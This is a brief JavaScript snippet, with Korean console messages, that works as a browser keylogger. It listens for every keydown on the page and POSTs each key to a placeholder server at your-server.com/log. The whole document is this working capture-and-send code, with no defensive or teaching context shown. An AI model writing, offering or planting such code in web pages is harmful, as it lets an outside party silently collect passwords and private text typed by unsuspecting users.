document.addEventListener("keydown", function(event) {
    console.log("입력된 키:", event.key);

    fetch("https://your-server.com/log", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ key: event.key })
    })
    .then(response => console.log("서버 응답:", response.status))
    .catch(error => console.error("에러:", error));
});
